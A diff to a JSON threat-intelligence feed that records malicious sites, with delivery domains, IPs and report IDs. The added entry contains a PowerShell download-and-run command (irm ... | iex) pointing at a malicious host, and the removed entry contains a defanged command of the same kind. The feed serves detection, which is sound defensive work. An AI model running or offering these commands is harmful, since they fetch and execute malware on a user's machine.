@@ -1,5 +1,28 @@
 [
   {
+    "UrlDomain": "purebrookkitchens.com",
+    "DeliveryUrl": [
+      "lskannsserv.beer",
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.0.94"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/7570b7171e7d3dd2",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/7570b7171e7d3dd2'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/7570b7171e7d3dd2"
+    ],
+    "ReportId": "cmwmti3a11uip0omlvh5hjhr9",
+    "ScannedAt": "2026-11-19T00:34:13.487000+00:00"
+  },
+  {
     "UrlDomain": "amanialnukhtha.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -17599,22 +17622,5 @@
     ],
     "ReportId": "cmw9zizln07hd0oml2za1wlqb",
     "ScannedAt": "2026-11-10T01:01:52.755000+00:00"
-  },
-  {
-    "UrlDomain": "2taxi.ir",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "213.108.240.86"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmw9xznov07gc0omlfempg6ha",
-    "ScannedAt": "2026-11-10T00:18:51.233000+00:00"
   }
 ]
